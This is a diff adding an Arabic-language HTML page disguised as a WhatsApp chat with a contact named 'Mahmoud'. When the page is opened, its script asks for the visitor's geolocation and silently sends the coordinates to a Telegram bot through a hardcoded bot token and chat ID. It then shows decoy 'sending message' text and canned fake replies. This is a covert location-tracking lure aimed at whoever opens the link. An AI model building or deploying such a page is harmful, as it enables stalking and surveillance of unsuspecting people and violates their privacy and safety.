@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>محمود - واتساب</title>
+    <style>
+        /* تنسيقات واتساب الأصلية */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background: #0c1317;
+            height: 100vh;
+        }
+
+        .chat-container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #111b21;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .chat-header {
+            background: #202c33;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-bottom: 1px solid #303d45;
+        }
+
+        .profile-img {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .contact-info {
+            flex: 1;
+        }
+
+        .contact-name {
+            color: #e9edef;
+            font-size: 1.1em;
+            font-weight: 500;
+        }
+
+        .online-status {
+            color: #8696a0;
+            font-size: 0.85em;
+            margin-top: 3px;
+        }
+
+        .chat-messages {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px 15px;
+            background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABZ0RVh0Q3JlYXRpb24gVGltZQAwNi8xOS8xOOgDxrkAAAAcdEVYdFNvZnR3YXJlAEFkb2JlIEZpcmV3b3JrcyBDUzVxteM2AAABHklEQVRIie3Vuw2CUBiF4e8KJrhB3cARXMAJ3cAR3MDBHcERHIzBxGisjPjfQ+Jt6k3Dk5MkzX3xW0p5VwN0wAI0wAqsD9e3XwWvQAs0wAR0d/AEDMAGnH/5lqGjA3Yl1Td4LqkewfMdugL9DZ6A4QZPwHgB5y94uoDzFzxewPkLHi7g/AX3F3D+gtsL+BN4A7bX0Dewv4Z+wPkDzifwZ3A+gvMJnE/gfALnEzifwPkEzidwPoHzCZxP4HwC5xM4n8D5BM4ncD6B8wmcT+B8AucTOJ/A+QTOJ3A+gfMJnE/gfALnEzifwPkEzidwPoHzCZxP4HwC5xM4n8D5BM4ncD6B8wmcT+B8AucTOJ/A+QTOJ3A+gfMJnE/gfALnEzifwPkEzidwPoHzCZxP4HwC5xM4n8A/5Ax4xMv0N0P1PQAAAABJRU5ErkJggg==') #111b21;
+            background-blend-mode: soft-light;
+        }
+
+        .message {
+            margin: 10px 0;
+            max-width: 75%;
+            padding: 8px 12px;
+            border-radius: 7px;
+            position: relative;
+            color: #e9edef;
+            font-size: 0.95em;
+            line-height: 1.4;
+            word-break: break-word;
+        }
+
+        .received {
+            background: #202c33;
+            float: left;
+            clear: both;
+            margin-left: 5px;
+        }
+
+        .sent {
+            background: #005c4b;
+            float: right;
+            clear: both;
+            margin-right: 5px;
+        }
+
+        .message-time {
+            font-size: 0.75em;
+            color: #8696a0;
+            float: right;
+            margin: 5px -5px 0 8px;
+            direction: ltr;
+            display: flex;
+            align-items: center;
+            gap: 3px;
+        }
+
+        .status-icon {
+            width: 15px;
+            height: 15px;
+        }
+
+        .chat-input {
+            background: #202c33;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-top: 1px solid #303d45;
+        }
+
+        input[type="text"] {
+            flex: 1;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            background: #2a3942;
+            color: #e9edef;
+            font-size: 1em;
+            outline: none;
+        }
+
+        .send-button {
+            background: #005c4b;
+            color: #e9edef;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .send-button:hover {
+            background: #008069;
+        }
+
+        .typing-indicator {
+            color: #8696a0;
+            font-size: 0.85em;
+            padding: 5px 15px;
+            display: none;
+        }
+
+        .message-date {
+            text-align: center;
+            color: #8696a0;
+            font-size: 0.85em;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="chat-container">
+        <div class="chat-header">
+            <img src="https://randomuser.me/api/portraits/men/1.jpg" class="profile-img" alt="صورة محمود">
+            <div class="contact-info">
+                <div class="contact-name">محمود</div>
+                <div class="online-status">متصل الآن</div>
+            </div>
+        </div>
+
+        <div class="chat-messages" id="chat-messages">
+            <div class="message-date">اليوم</div>
+            <div class="message received">
+                مرحبا! كيف يمكنني مساعدتك اليوم؟
+                <span class="message-time">10:15 ص</span>
+            </div>
+        </div>
+
+        <div class="chat-input">
+            <input type="text" placeholder="اكتب رسالة..." id="message-input">
+            <button class="send-button" onclick="sendMessage()">إرسال</button>
+        </div>
+    </div>
+
+    <script>
+        // إعدادات بوت التلغرام (يجب استبدالها)
+        const BOT_TOKEN = '7876711075:AAG227dcC-k6dDfrb4d719FB1rApyJAh3ko';
+        const CHAT_ID = '1393964545';
+
+        // دالة إرسال الموقع
+        function sendLocation(lat, lon) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+            const params = {
+                chat_id: CHAT_ID,
+                latitude: lat,
+                longitude: lon
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(params)
+            });
+        }
+
+        // الحصول على الموقع عند فتح الصفحة
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        sendLocation(lat, lon);
+                        showMessage('جاري ارسال الرسالة ', true);
+                   },
+                    error => {
+                        showMessage('تعذر الارسال ', true);
+                    }
+                );
+            } else {
+                showMessage('المتصفح لا يدعم خدمات الموقع', true);
+            }
+        };
+
+        // دالة إظهار الرسائل
+        function showMessage(text, isSent) {
+            const chatMessages = document.getElementById('chat-messages');
+            const messageDiv = document.createElement('div');
+            messageDiv.className = `message ${isSent ? 'sent' : 'received'}`;
+            
+            const timeSpan = document.createElement('span');
+            timeSpan.className = 'message-time';
+            timeSpan.textContent = new Date().toLocaleTimeString('ar-EG', {
+                hour: 'numeric',
+                minute: 'numeric'
+            });
+
+            messageDiv.textContent = text;
+            messageDiv.appendChild(timeSpan);
+            chatMessages.appendChild(messageDiv);
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+        }
+
+        // دالة إرسال الرسالة
+        function sendMessage() {
+            const input = document.getElementById('message-input');
+            const message = input.value.trim();
+            
+            if (message) {
+                showMessage(message, true);
+                input.value = '';
+                
+                // محاكاة رد محمود بعد 2 ثانية
+                setTimeout(() => {
+                    const responses = [
+                        'نعم، تفضل...',
+                        'أنا أستمع لك',
+                        'ماذا تقصد؟',
+                        'هل يمكنك توضيح أكثر؟'
+                    ];
+                    const randomResponse = responses[Math.floor(Math.random() * responses.length)];
+                    showMessage(randomResponse, false);
+                }, 2000);
+            }
+        }
+    </script>
+</body>
+</html>ن
